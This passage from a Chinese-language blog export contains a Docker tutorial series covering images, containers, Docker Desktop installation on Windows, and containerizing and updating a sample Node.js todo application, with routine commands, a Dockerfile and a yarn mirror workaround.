<p>你可以创建自己的镜像，也可以仅使用其他人创建并在注册表中发布的镜像。要构建你自己的镜像，你可以使用简单的语法创建一个<em>Dockerfile</em> ，用于定义创建镜像并运行它所需的步骤。Dockerfile 中的每条指令都会在镜像中创建一个层。当你更改 Dockerfile 并重建镜像时，只会重建那些已更改的层。与其他虚拟化技术相比，这就是镜像如此轻量、小型且快速的部分原因。</p>
<h4 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h4><p>容器是镜像的可运行实例。你可以使用 Docker API 或 CLI 创建、启动、停止、移动或删除容器。你可以将容器连接到一个或多个网络，为其附加存储，甚至可以根据其当前状态创建一个新镜像。</p>
<p>默认情况下，容器与其他容器及其主机相对较好地隔离。你可以控制容器的网络、存储或其他底层子系统与其他容器或主机的隔离程度。</p>
<p>容器由其镜像以及你在创建或启动它时提供给它的任何配置选项来定义。<strong>当容器被删除时，任何未存储在持久存储中的状态更改都会消失</strong>。</p>
<h5 id="docker-run命令示例"><a href="#docker-run命令示例" class="headerlink" title="docker run命令示例"></a><code>docker run</code>命令示例</h5><p>以下命令运行一个<code>ubuntu</code>容器，以交互方式附加到本地命令行会话，然后运行<code>/bin/bash</code>.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -i -t ubuntu /bin/bash</span><br><span class="line"><span class="comment"># 简写方式</span></span><br><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>当你运行此命令时，会发生以下情况（假设你使用默认注册表配置）：</p>
<ol>
<li>如果你本地没有该<code>ubuntu</code>镜像，Docker 会从你配置的注册表中提取该镜像，就像你<code>docker pull ubuntu</code>手动运行一样。</li>
<li>Docker 创建一个新容器，就像你手动运行命令一样<code>docker container create</code> 。</li>
<li>Docker 为容器分配一个读写文件系统，作为其最后一层。这允许正在运行的容器在其本地文件系统中创建或修改文件和目录。</li>
<li>Docker 创建一个网络接口来将容器连接到默认网络，因为你没有指定任何网络选项。这包括为容器分配 IP 地址。<strong>默认情况下，容器可以使用主机的网络连接来连接到外部网络</strong>。</li>
<li>Docker 启动容器并执行<code>/bin/bash</code>. 由于容器以交互方式运行并附加到你的终端（由于<code>-i</code>和<code>-t</code> 标志），因此你可以使用键盘提供输入，同时将输出记录到你的终端。</li>
<li>当你键入<code>exit</code>终止<code>/bin/bash</code>命令时，容器会停止但不会被删除。你可以重新启动它或将其删除。</li>
</ol>
<h2 id="底层技术"><a href="#底层技术" class="headerlink" title="底层技术"></a>底层技术</h2><p>Docker 使用<a href="https://golang.org/">Go 编程语言</a>编写，并利用 Linux 内核的多个特性来提供其功能。Docker 使用一种称为<em>容器</em><code>namespaces</code>的技术来提供隔离的工作空间。当您运行容器时，Docker 会 为该容器创建一组<em>命名空间。</em></p>
<p>这些命名空间提供了一层隔离。容器的每个方面都在单独的命名空间中运行，并且其访问仅限于该命名空间。</p>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><ul>
<li>阅读有关安装 Docker 的信息。</li>
<li>通过 Docker 入门教程获得实践经验 。</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.docker.com/">Docker 官网</a></p>
<p>[2] <a href="https://github.com/docker/docker-ce">Github Docker 源码</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.2-Docker桌面</title>
    <url>/2022/05/12/20220512-Docker.2-Docker%E6%A1%8C%E9%9D%A2/</url>
    <content><![CDATA[<p>Docker Desktop 是一款适用于 Mac、Linux 或 Windows 环境的一键安装应用程序，使您能够构建和共享容器化应用程序和微服务。</p>
<span id="more"></span>

<h2 id="Docker-桌面"><a href="#Docker-桌面" class="headerlink" title="Docker 桌面"></a>Docker 桌面</h2><p>Docker Desktop 即 Docker 桌面。</p>
<p>它提供了一个简单的 GUI（图形用户界面），可让您直接从计算机管理容器、应用程序和镜像。Docker Desktop 可以单独使用，也可以作为 CLI 的补充工具。</p>
<p>Docker Desktop 减少了复杂设置所花费的时间，因此您可以专注于编写代码。它负责端口映射、文件系统问题和其他默认设置，并定期更新错误修复和安全更新。</p>
<h2 id="Docker-Desktop-包含哪些内容"><a href="#Docker-Desktop-包含哪些内容" class="headerlink" title="Docker Desktop 包含哪些内容"></a>Docker Desktop 包含哪些内容</h2><ul>
<li><a href="https://docs.docker.com/engine/">Docker 引擎</a></li>
<li>Docker CLI 客户端</li>
<li><a href="https://docs.docker.com/build/">Docker 构建</a></li>
<li><a href="https://docs.docker.com/desktop/extensions/">扩展</a></li>
<li><a href="https://docs.docker.com/compose/">Docker 组合</a></li>
<li><a href="https://docs.docker.com/engine/security/trust/">Docker 内容信任</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/">Kubernetes</a></li>
<li><a href="https://github.com/docker/docker-credential-helpers/">凭证助手</a></li>
</ul>
<h2 id="Docker-Desktop-有哪些主要功能"><a href="#Docker-Desktop-有哪些主要功能" class="headerlink" title="Docker Desktop 有哪些主要功能"></a>Docker Desktop 有哪些主要功能</h2><ul>
<li>能够以多种语言和框架在任何云平台上容器化和共享任何应用程序。</li>
<li>快速安装和设置完整的 Docker 开发环境。</li>
<li>包括最新版本的 Kubernetes。</li>
<li>在 Windows 上，能够在 Linux 和 Windows Server 环境之间切换来构建应用程序。</li>
<li>借助本机 Windows Hyper-V 虚拟化实现快速、可靠的性能。</li>
<li>能够通过 Windows 计算机上的 WSL 2 在 Linux 上本机工作。</li>
<li>代码和数据的卷挂载，包括文件更改通知和在本地主机网络上轻松访问正在运行的容器</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>Docker Desktop 可与您选择的开发工具和语言配合使用，并让您可以访问 <a href="https://hub.docker.com/">Docker Hub</a>中经过认证的庞大镜像和模板库。这使开发团队能够扩展其环境，以使用安全存储库快速自动构建、持续集成和协作。</p>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><ul>
<li>了解 Docker Desktop 在 Mac、Windows、Linux 上的安装</li>
</ul>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.2.1-在Windows上安装</title>
    <url>/2022/05/12/20220512-Docker.2.1-%E5%9C%A8Windows%E4%B8%8A%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>Docker 是一个用于开发、发布和运行应用程序的开放平台。Docker 使您能够将应用程序与基础设施分离，以便您可以快速交付软件。借助 Docker，您可以像管理应用程序一样管理基础设施。通过利用 Docker 的方法来快速交付、测试和部署代码，您可以显著减少编写代码和在生产中运行代码之间的延迟。</p>
<span id="more"></span>

<p>您可以在多个平台上下载并安装 Docker。请参阅以下部分并选择最适合您的安装路径。</p>
<h2 id="适用于-Windows-的-Docker-桌面"><a href="#适用于-Windows-的-Docker-桌面" class="headerlink" title="适用于 Windows 的 Docker 桌面"></a>适用于 Windows 的 Docker 桌面</h2><p>一个本机 Windows 应用程序，可将<strong>所有 Docker 工具</strong>交付到您的 Windows 计算机。</p>
<blockquote>
<p>! <strong>Docker 桌面</strong></p>
<p>Docker Desktop 在大型企业（超过 250 名员工或年收入超过 1000 万美元）的商业使用需要付费订阅。</p>
</blockquote>
<p><a href="https://docs.docker.com/desktop/release-notes/">Docker 桌面版发行说明</a></p>
<h2 id="系统要求"><a href="#系统要求" class="headerlink" title="系统要求"></a>系统要求</h2><p>您必须<strong>先满足</strong>以下要求才能在 Windows 上成功安装 Docker Desktop：</p>
<h3 id="WSL-2-后端"><a href="#WSL-2-后端" class="headerlink" title="WSL 2 后端"></a>WSL 2 后端</h3><ul>
<li>WSL 版本 1.1.3.0 或更高版本。</li>
<li>Windows 11 64 位：家庭版或专业版 21H2 或更高版本，或者企业版或教育版 21H2 或更高版本。</li>
<li>Windows 10 64 位：家庭版或专业版 21H2（内部版本 19044）或更高版本，或者企业版或教育版 21H2（内部版本 19044）或更高版本。</li>
<li>在 Windows 上启用 WSL 2 功能。有关详细说明，请参阅 <a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">Microsoft 文档</a>。</li>
<li>要在 Windows 10 或 Windows 11 上成功运行 WSL 2，需要满足以下硬件先决条件：<ul>
<li><a href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation">具有二级地址转换 (SLAT)</a>功能的 64 位处理器</li>
<li>4GB 系统内存</li>
<li>必须在 BIOS 设置中启用 BIOS 级硬件虚拟化支持。有关详细信息，请参阅 <a href="https://docs.docker.com/desktop/troubleshoot/topics/#virtualization">虚拟化</a>。</li>
</ul>
</li>
<li>下载并安装<a href="https://docs.microsoft.com/windows/wsl/wsl2-kernel">Linux 内核更新包</a>。</li>
</ul>
<h3 id="Hyper-V-后端和-Windows-容器"><a href="#Hyper-V-后端和-Windows-容器" class="headerlink" title="Hyper-V 后端和 Windows 容器"></a>Hyper-V 后端和 Windows 容器</h3><ul>
<li><p>Windows 11 64 位：专业版 21H2 或更高版本，或者企业版或教育版 21H2 或更高版本。</p>
</li>
<li><p>Windows 10 64 位：Pro 21H2（内部版本 19044）或更高版本，或者企业版或教育版 21H2（内部版本 19044）或更高版本。</p>
<p>  <a href="https://docs.docker.com/desktop/install/windows-install/#wsl-2-backend">对于 Windows 10 和 Windows 11 家庭版，请参阅 WSL 2 后端选项</a>卡中的系统要求。</p>
</li>
<li><p>必须启用 Hyper-V 和容器 Windows 功能。</p>
</li>
<li><p>要在 Windows 10 上成功运行客户端 Hyper-V，需要满足以下硬件先决条件：</p>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Second_Level_Address_Translation">具有二级地址转换 (SLAT)</a>功能的 64 位处理器</li>
<li>4GB 系统内存</li>
<li>必须在 BIOS 设置中启用 BIOS 级硬件虚拟化支持。有关详细信息，请参阅 <a href="https://docs.docker.com/desktop/troubleshoot/topics/#virtualization">虚拟化</a>。</li>
</ul>
</li>
</ul>
<p>使用 Docker Desktop 创建的容器和镜像在安装它的计算机上的所有用户帐户之间共享。这是因为所有 Windows 帐户都使用相同的 VM 来构建和运行容器。<strong>请注意，使用 Docker Desktop WSL 2 后端时无法在用户帐户之间共享容器和镜像</strong>。</p>
<p>Docker Business 客户支持在 VMware ESXi 或 Azure VM 内运行 Docker Desktop。它需要首先在虚拟机管理程序上启用嵌套虚拟化。有关更多信息，请参阅<a href="https://docs.docker.com/desktop/vm-vdi/">在 VM 或 VDI 环境中运行 Docker Desktop</a>。</p>
<h3 id="关于-Windows-容器"><a href="#关于-Windows-容器" class="headerlink" title="关于 Windows 容器"></a>关于 Windows 容器</h3><p>正在寻找有关使用 Windows 容器的信息？</p>
<ul>
<li><a href="https://docs.docker.com/desktop/faqs/windowsfaqs/#how-do-i-switch-between-windows-and-linux-containers">在 Windows 和 Linux 容器之间切换</a> 描述了如何在 Docker Desktop 中在 Linux 和 Windows 容器之间切换，并向您介绍下面提到的教程。</li>
<li><a href="https://github.com/docker/labs/blob/master/windows/windows-containers/README.md">Windows 容器入门（实验室）</a> 提供了有关如何在 Windows 10、Windows Server 2016 和 Windows Server 2019 上设置和运行 Windows 容器的教程。它向您展示了如何将 MusicStore 应用程序与 Windows 容器结合使用。</li>
<li>Docker 网站上的适用于 Windows 的 Docker 容器平台<a href="https://www.docker.com/microsoft/">文章和博客文章。</a></li>
</ul>
<blockquote>
<p>要运行 Windows 容器，您需要 Windows 10 或 Windows 11 专业版或企业版。Windows 家庭版或教育版仅允许您运行 Linux 容器。</p>
</blockquote>
<h2 id="在-Windows-上安装-Docker-Desktop"><a href="#在-Windows-上安装-Docker-Desktop" class="headerlink" title="在 Windows 上安装 Docker Desktop"></a>在 Windows 上安装 Docker Desktop</h2><h3 id="交互式安装"><a href="#交互式安装" class="headerlink" title="交互式安装"></a>交互式安装</h3><ol>
<li><p>双击<strong>Docker Desktop Installer.exe</strong>运行安装程序。</p>
<p> 如果您还没有下载安装程序 ( )，您可以从<a href="https://hub.docker.com/editions/community/docker-ce-desktop-windows/"><strong>Docker Hub</strong></a><code>Docker Desktop Installer.exe</code>获取它 。它通常会下载到您的文件夹，或者您可以从网络浏览器底部的最近下载栏运行它。<code>Downloads</code></p>
</li>
<li><p>出现提示时，请确保选择或不选择“配置”页面上的“<strong>使用 WSL 2 而不是 Hyper-V”选项，具体取决于您选择的后端。</strong></p>
<p> 如果您的系统仅支持这两个选项之一，您将无法选择使用哪个后端。</p>
</li>
<li><p>按照安装向导上的说明授权安装程序并继续安装。</p>
</li>
<li><p>安装成功后，单击<strong>“关闭”</strong>完成安装过程。</p>
</li>
<li><p>如果您的管理员帐户与您的用户帐户不同，则必须将该用户添加到<strong>docker-users</strong>组。以<strong>管理员</strong>身份运行<strong>计算机管理</strong>并导航到<strong>本地用户和组</strong>&gt;<strong>组</strong>&gt; <strong>docker-users</strong>。右键单击将用户添加到组中。注销并重新登录以使更改生效。</p>
</li>
</ol>
<h2 id="启动-Docker-桌面"><a href="#启动-Docker-桌面" class="headerlink" title="启动 Docker 桌面"></a>启动 Docker 桌面</h2><p>Docker Desktop 在安装后不会自动启动。启动 Docker 桌面：</p>
<ol>
<li><p>搜索 Docker，然后在搜索结果中选择<strong>Docker Desktop 。</strong></p>
</li>
<li><p>Docker 菜单显示 Docker 订阅服务协议窗口。</p>
<p> 以下是要点总结：</p>
<ul>
<li>Docker Desktop 对于小型企业（员工少于 250 名且年收入少于 1000 万美元）、个人使用、教育和非商业开源项目免费。</li>
<li>否则，需要付费订阅才能用于专业用途。</li>
<li>政府实体也需要付费订阅。</li>
<li>Docker Pro、Team 和 Business 订阅包括 Docker Desktop 的商业用途。</li>
</ul>
</li>
<li><p>选择<strong>接受</strong>继续。Docker Desktop 在您接受条款后启动。</p>
<p> 请注意，如果您不同意这些条款，Docker Desktop 将不会运行。您可以选择稍后打开 Docker Desktop 接受这些条款。</p>
<p> 更多信息请参见<a href="https://www.docker.com/legal/docker-subscription-service-agreement/">Docker Desktop 订阅服务协议</a>。我们建议您还可以阅读<a href="https://www.docker.com/pricing/faq">常见问题解答</a>。</p>
</li>
</ol>
<h2 id="接下来去哪里"><a href="#接下来去哪里" class="headerlink" title="接下来去哪里"></a>接下来去哪里</h2><ul>
<li>Docker 入门是一个教程，教您如何部署多服务堆栈。</li>
<li><a href="https://docs.docker.com/desktop/backup-and-restore/">备份和恢复数据</a>提供了有关备份和恢复与 Docker 相关的数据的说明。</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.runoob.com/docker/windows-docker-install.html">Windows Docker 安装</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.3-入门概述</title>
    <url>/2022/05/13/20220513-Docker.3-%E5%85%A5%E9%97%A8%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<p>Docker 入门包含有关如何开始使用 Docker 的分步说明。您将在 Docker 入门中学习和执行的一些内容包括：</p>
<ul>
<li>将镜像构建并作为容器运行。</li>
<li>使用 Docker Hub 共享镜像。</li>
<li>使用带有数据库的多个容器来部署 Docker 应用程序。</li>
<li>使用 Docker Compose 运行应用程序。</li>
</ul>
<span id="more"></span>

<p>在开始学习 Docker 入门的部分内容之前，您应该了解容器和镜像。</p>
<h2 id="什么是容器"><a href="#什么是容器" class="headerlink" title="什么是容器"></a>什么是容器</h2><p>简而言之，容器是计算机上的沙盒进程，与主机上的所有其他进程隔离。这种隔离利用了<a href="https://medium.com/@saschagrunert/demystifying-containers-part-i-kernel-space-2c53d6979504">内核命名空间和 cgroup</a>，这些功能在 Linux 中已经存在很长时间了。Docker 致力于使这些功能变得平易近人且易于使用。总而言之，容器：</p>
<ul>
<li>是镜像的可运行实例。您可以使用 DockerAPI 或 CLI 创建、启动、停止、移动或删除容器。</li>
<li>可以在本地机器、虚拟机上运行或部署到云端。</li>
<li>是可移植的（可以在任何操作系统上运行）。</li>
<li>与其他容器隔离并运行自己的软件、二进制文件和配置。</li>
</ul>
<h2 id="什么是容器镜像"><a href="#什么是容器镜像" class="headerlink" title="什么是容器镜像"></a>什么是容器镜像</h2><p>运行容器时，它使用隔离的文件系统。该自定义文件系统由容器镜像提供。由于镜像包含容器的文件系统，因此它必须包含运行应用程序所需的所有内容 - 所有依赖项、配置、脚本、二进制文件等。镜像还包含容器的其他配置，例如环境变量、要运行的默认命令、和其他元数据。</p>
<blockquote>
<p>如果您熟悉<code>chroot</code>，请将容器视为<code>chroot</code>。文件系统只是来自镜像。但是，容器添加了仅使用 chroot 时不可用的额外隔离。</p>
</blockquote>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><ul>
<li>在下一部分中，您将容器化您的第一个应用程序。</li>
</ul>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.3.1-将应用程序容器化</title>
    <url>/2022/05/13/20220513-Docker.3.1-%E5%B0%86%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%B9%E5%99%A8%E5%8C%96/</url>
    <content><![CDATA[<p>在 Docker 入门的其余部分中，您将使用在 Node.js 上运行的简单待办事项列表管理器。如果您不熟悉 Node.js，请不要担心。本指南不需要任何 JavaScript 经验。</p>
<span id="more"></span>

<p>要完成 Docker 入门，您需要具备以下条件：</p>
<ul>
<li><p>Docker 在本地运行。按照说明<a href="https://docs.docker.com/get-docker/">下载并安装 Docker</a>。</p>
</li>
<li><p>一个 Git 客户端。</p>
<blockquote>
<p>如果您使用 Windows 并希望使用 Git Bash 运行 Docker 命令，请参阅<a href="https://docs.docker.com/desktop/troubleshoot/topics/#working-with-git-bash">使用 Git Bash</a>了解语法差异。</p>
</blockquote>
</li>
<li><p>用于编辑文件的 IDE 或文本编辑器。Docker 建议使用<a href="https://code.visualstudio.com/">Visual Studio Code</a>。</p>
</li>
<li><p>对容器和镜像的概念性理解。参见<a href="/2022/05/11/20220511-Docker.1-%E4%BA%86%E8%A7%A3/" title="Docker.1-了解">Docker.1-了解</a>。</p>
</li>
</ul>
<h2 id="获取应用程序"><a href="#获取应用程序" class="headerlink" title="获取应用程序"></a>获取应用程序</h2><p>在运行应用程序之前，您需要将应用程序源代码获取到您的计算机上。</p>
<ol>
<li><p>使用以下命令克隆<a href="https://github.com/docker/getting-started/tree/master">入门存储库：</a></p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/docker/getting-started.git</span><br></pre></td></tr></table></figure>
</li>
<li><p>查看克隆存储库的内容。在该<code>getting-started/app</code>目录中，您应该看到<code>package.json</code>和两个子目录（<code>src</code>和<code>spec</code>）。</p>
<p> <img src="https://cdn.huatree.top/image-20230702231049724.png" alt="image-20230702231049724"></p>
</li>
</ol>
<h2 id="构建应用程序的容器镜像"><a href="#构建应用程序的容器镜像" class="headerlink" title="构建应用程序的容器镜像"></a>构建应用程序的容器镜像</h2><p>要构建容器镜像，您需要使用<code>Dockerfile</code>。Dockerfile 只是一个基于文本的文件，没有文件扩展名，但包含指令脚本。Docker 使用此脚本构建容器镜像。</p>
<ol>
<li><p>在该<code>app</code>目录中与该文件相同的位置<code>package.json</code>，创建一个名为<code>Dockerfile</code>. 您可以使用以下命令根据您的操作系统创建 Dockerfile。</p>
<p> <strong>Mac&#x2F;Linux</strong></p>
<p> 在终端中，运行下面列出的命令。</p>
<p> 将目录更改为该<code>app</code>目录。<code>getting-started/app</code>替换为您的目录的路径<code>/path/to/app</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/app</span><br></pre></td></tr></table></figure>

<p> 创建一个名为<code>Dockerfile</code>的空文件。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> Dockerfile</span><br></pre></td></tr></table></figure>

<p> <strong>Windows</strong></p>
<p> 在 Windows 命令提示符中，运行下面列出的命令。</p>
<p> 将目录更改为该<code>app</code>目录。<code>getting-started/app</code>替换为您的目录的路径<code>/path/to/app</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> \path\to\app</span><br></pre></td></tr></table></figure>

<p> 创建一个名为 的空文件<code>Dockerfile</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> nul &gt; Dockerfile</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用文本编辑器或代码编辑器，将以下内容添加到 Dockerfile 中：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># syntax=docker/dockerfile:1</span></span><br><span class="line"></span><br><span class="line">FROM node:18-alpine</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . .</span><br><span class="line">RUN yarn install --production</span><br><span class="line">CMD [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;src/index.js&quot;</span>]</span><br><span class="line">EXPOSE 3000</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用以下命令构建容器镜像：</p>
<p> 在终端中，将目录更改为该<code>getting-started/app</code>目录。替换<code>/path/to/app</code>为您的目录的路径<code>getting-started/app</code>。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/app</span><br></pre></td></tr></table></figure>

<p> 构建容器镜像。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t getting-started .</span><br></pre></td></tr></table></figure>

<p> 该<code>docker build</code>命令使用 Dockerfile 构建新的容器镜像。您可能已经注意到 Docker 下载了很多“层”。这是因为您指示构建器您想要从<code>node:18-alpine</code>镜像开始。但是，由于您的计算机上没有该镜像，因此 Docker 需要下载该镜像。</p>
<p> Docker 下载镜像后，Dockerfile 中的指令会复制到您的应用程序中并用于<code>yarn</code>安装应用程序的依赖项。该<code>CMD</code>指令指定从此镜像启动容器时要运行的默认命令。</p>
<p> 最后，<code>-t</code>旗帜标记您的镜像。可以简单地将其视为最终镜像的人类可读名称。由于您命名了该镜像<code>getting-started</code>，因此您可以在运行容器时引用该镜像。</p>
<p> <code>docker build</code>命令末尾的<code>.</code>是告诉 Docker 它应该在当前目录中查找<code>Dockerfile</code>。</p>
</li>
</ol>
<blockquote>
<p>构建容器镜像的过程中，如果卡在 yarn install，则删掉原来的 yarn.lock，切换 yarn 镜像源<code>yarn config set registry https://registry.npmmirror.com/</code>，手动 yarn install，生成新的 yarn.lock，再删除<code>node_modules</code>，最后再构建容器镜像<code>docker build -t getting-started .</code>。</p>
</blockquote>
<h2 id="启动应用程序容器"><a href="#启动应用程序容器" class="headerlink" title="启动应用程序容器"></a>启动应用程序容器</h2><p>现在您已经有了镜像，您可以在<a href="https://docs.docker.com/get-started/overview/#docker-objects">容器</a>中运行应用程序。为此，您将使用该<code>docker run</code>命令。</p>
<ol>
<li><p>使用以下命令启动容器<code>docker run</code>并指定刚刚创建的镜像的名称：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -dp 127.0.0.1:3000:3000 getting-started</span><br></pre></td></tr></table></figure>

<p> 该<code>-d</code>标志（ 的缩写<code>--detach</code>）在后台运行容器。该<code>-p</code>标志（ 的缩写<code>--publish</code>）在主机和容器之间创建端口映射。该<code>-p</code>标志采用<code>HOST:CONTAINER</code>格式的字符串值，其中<code>HOST</code>是主机上的地址，<code>CONTAINER</code>是容器上的端口。此处显示的命令将容器的端口 3000 发布到主机上的<code>127.0.0.1:3000</code>(<code>localhost:3000</code>)。如果没有端口映射，您将无法从主机访问应用程序</p>
</li>
<li><p>几秒钟后，打开 Web 浏览器访问<a href="http://localhost:3000/">http://localhost:3000</a>。您应该会看到您的应用程序。</p>
<p> <img src="https://cdn.huatree.top/image-20230703001236510.png" alt="image-20230703001236510"></p>
</li>
<li><p>继续添加一两个项目，看看它是否按您的预期工作。您可以将项目标记为完成并将其删除。您的前端已成功将项目存储在后端。</p>
</li>
</ol>
<p>此时，您应该有一个正在运行的待办事项列表管理器，其中包含一些项目，全部由您构建。</p>
<p>如果您快速查看一下容器，您应该会看到至少有一个正在使用该<code>getting-started</code>镜像并在 port <code>3000</code> 上运行的容器。要查看容器，您可以使用 CLI 或 Docker Desktop 的图形界面。</p>
<p><strong>命令行界面</strong></p>
<p><code>docker ps</code>在终端中运行以下命令以列出您的容器。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<p>应出现类似于以下内容的输出。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                      NAMES</span><br><span class="line">df784548666d        getting-started     <span class="string">&quot;docker-entrypoint.s…&quot;</span>   2 minutes ago       Up 2 minutes        127.0.0.1:3000-&gt;3000/tcp   priceless_mcclintock</span><br></pre></td></tr></table></figure>

<p><strong>Docker 桌面</strong></p>
<p>在 Docker Desktop 中，选择<strong>“容器”</strong>选项卡以查看容器列表。</p>
<p><img src="https://cdn.huatree.top/image-20230703001632259.png" alt="image-20230703001632259"></p>
<h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p>在这个简短的部分中，您学习了有关创建 Dockerfile 来构建容器镜像的基础知识。构建镜像后，您启动了一个容器并看到正在运行的应用程序。</p>
<p>接下来，您将对应用程序进行修改，并了解如何使用新镜像更新正在运行的应用程序。在此过程中，您将学习一些其他有用的命令。</p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker.3.2-更新应用程序</title>
    <url>/2022/05/14/20220514-Docker.3.2-%E6%9B%B4%E6%96%B0%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>您将更新应用程序和容器镜像。您还将学习如何停止和删除容器。</p>
<span id="more"></span>

<h2 id="更新源码"><a href="#更新源码" class="headerlink" title="更新源码"></a>更新源码</h2><p>在下面的步骤中，您将在没有任何待办事项列表项时将“空文本”更改为“您还没有待办事项！上面加一个！”</p>
<ol>
<li><p>在<code>src/static/js/app.js</code>文件中，更新第 56 行以使用新的空文本。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">- &lt;p className=<span class="string">&quot;text-center&quot;</span>&gt;No items yet! Add one above!&lt;/p&gt;</span><br><span class="line">+ &lt;p className=<span class="string">&quot;text-center&quot;</span>&gt;You have no todo items yet! Add one above!&lt;/p&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>docker build</code>使用您在<a href="/2022/05/13/20220513-Docker.3.1-%E5%B0%86%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%B9%E5%99%A8%E5%8C%96/" title="Docker.3.1-将应用程序容器化">Docker.3.1-将应用程序容器化</a>中使用的相同命令构建镜像的更新版本。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build -t getting-started .</span><br></pre></td></tr></table></figure>

<p> 你可能会看到这样的错误：</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">22.97 error An unexpected error occurred: <span class="string">&quot;https://registry.yarnpkg.com/express/-/express-4.18.2.tgz: connect ECONNREFUSED 104.16.27.34:443&quot;</span>.</span><br><span class="line">22.97 info If you think this is a bug, please open a bug report with the information provided <span class="keyword">in</span> <span class="string">&quot;/app/yarn-error.log&quot;</span>.</span><br><span class="line">22.97 info Visit https://yarnpkg.com/en/docs/cli/install <span class="keyword">for</span> documentation about this <span class="built_in">command</span>.        </span><br><span class="line">------</span><br><span class="line">Dockerfile:6</span><br><span class="line">--------------------</span><br><span class="line">   4 |     WORKDIR /app</span><br><span class="line">   5 |     COPY . .</span><br><span class="line">   6 | &gt;&gt;&gt; RUN yarn install --production</span><br><span class="line">   7 |     CMD [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;src/index.js&quot;</span>]</span><br><span class="line">   8 |     EXPOSE 3000</span><br><span class="line">--------------------</span><br><span class="line">ERROR: failed to solve: process <span class="string">&quot;/bin/sh -c yarn install --production&quot;</span> did not complete successfully: <span class="built_in">exit</span> code: 1</span><br></pre></td></tr></table></figure>

<p> 这是由于<strong>资源地址请求超时</strong>造成的，更换一下请求地址，可以修改<code>Dockerfile</code></p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># syntax=docker/dockerfile:1</span></span><br><span class="line"></span><br><span class="line">FROM node:18-alpine</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . .</span><br><span class="line">RUN yarn config <span class="built_in">set</span> registry https://registry.npmmirror.com</span><br><span class="line">RUN yarn cache clean</span><br><span class="line">RUN yarn install --production</span><br><span class="line">CMD [<span class="string">&quot;node&quot;</span>, <span class="string">&quot;src/index.js&quot;</span>]</span><br><span class="line">EXPOSE 3000</span><br></pre></td></tr></table></figure>

<p> 其他解决方案，<a href="https://github.com/docker/getting-started/issues/381">详见</a></p>
</li>
<li><p>使用更新的代码启动一个新容器。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -dp 127.0.0.1:3000:3000 getting-started</span><br></pre></td></tr></table></figure></li>
</ol>
<p>您可能会看到这样的错误（ID 会不同）：</p>
